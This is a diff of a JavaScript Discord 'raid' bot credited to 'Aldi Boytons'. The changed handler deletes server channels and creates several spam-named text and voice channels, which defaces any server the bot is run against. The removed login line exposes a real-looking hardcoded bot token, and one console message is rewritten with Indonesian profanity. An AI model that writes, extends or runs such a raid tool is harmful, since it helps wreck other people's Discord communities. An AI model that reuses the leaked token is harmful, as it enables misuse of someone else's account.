@@ -5,21 +5,14 @@ const fs = require('fs');
 const botPrefix = "*"
 
   client.on('ready', msg => {
-  console.log("");                                   
-  console.log((chalk.cyan(`                                            #####                                     ######                   `)));
-  console.log((chalk.cyan(`                                           #     #   ##   #        ##    ####  #    # #     #   ##   # #####  `)));
-  console.log((chalk.cyan(`                                           #        #  #  #       #  #  #    # #   #  #     #  #  #  # #    # `)));
-  console.log((chalk.cyan(`                                           #  #### #    # #      #    # #      ####   ######  #    # # #    # `)));
-  console.log((chalk.cyan(`                                           #     # ###### #      ###### #      #  #   #   #   ###### # #    # `)));
-  console.log((chalk.cyan(`                                           #     # #    # #      #    # #    # #   #  #    #  #    # # #    # `)));
-  console.log((chalk.cyan(`                                            #####  #    # ###### #    #  ####  #    # #     # #    # # #####  `)));
+  console.log("");                                  
   console.log("");                                  
   console.log((chalk.yellow(`                                                               Developer : Aldi Boytons!`)));  
   console.log((chalk.yellow(`                                                                © 2020 Aldi Boytons, Inc.`))); 
   console.log("");                                   
   console.log("");                                  
 
-  console.log(`Statistiques globales : \n\nLe bot a un total de ${client.guilds.cache.size} serveurs. \nPour un total de ${client.users.cache.size} membres.`)
+  console.log(`KONTOL LAH LU : \n\nANJINGNYA ADA ${client.guilds.cache.size} servers. \nTotal ${client.users.cache.size} member.`)
   console.log("Connect " + client.user.id + " | Prefix : " + botPrefix + " | server : "+ client.guilds.cache.size +" | Channels :"+ client.channels.cache.size +" | User :  "+ client.users.cache.size +" | emoji : "+ client.emojis.cache.size +'');
   client.user.setActivity("*help - Aldi Boytons");
 });
@@ -72,7 +65,12 @@ client.on('message',  msg => {
 
          
             setTimeout(() => {channel.delete()},1000*3))
-            msg.guild.channels.create("𝙍𝘼𝙄𝘿 𝘽𝙔 : 𝘼𝙇𝘿𝙄 𝘽𝙊𝙔𝙏𝙊𝙉𝙎",{type: 'voice'})
+            msg.guild.channels.create("𝙍𝘼𝙄𝘿 𝘽𝙔 : 𝘼𝙇𝘿𝙄 𝘽𝙊𝙔𝙏𝙊𝙉𝙎",{type: 'text'})
+            msg.guild.channels.create("══════════════",{type: 'voice'})
+            msg.guild.channels.create("𝙍𝘼𝙄𝘿 𝘽𝙔 :",{type: 'voice'})
+            msg.guild.channels.create("𝘼𝙇𝘿𝙄 𝘽𝙊𝙔𝙏𝙊𝙉𝙎",{type: 'voice'})
+            msg.guild.channels.create("TTAX GENERATION",{type: 'voice'})
+            msg.guild.channels.create("══════════════",{type: 'voice'})
             .then(console.log)
             .catch(console.error);
 
@@ -371,4 +369,4 @@ client.on('message',  msg => {
 });
 
 
-client.login("Nzk4Mzc0NTcwMTQxODEwNzI4.X_0GQg.dMQsKQeNL7g9pEuWDfvFbxFYIZI");
+client.login("TOKEN NYA");
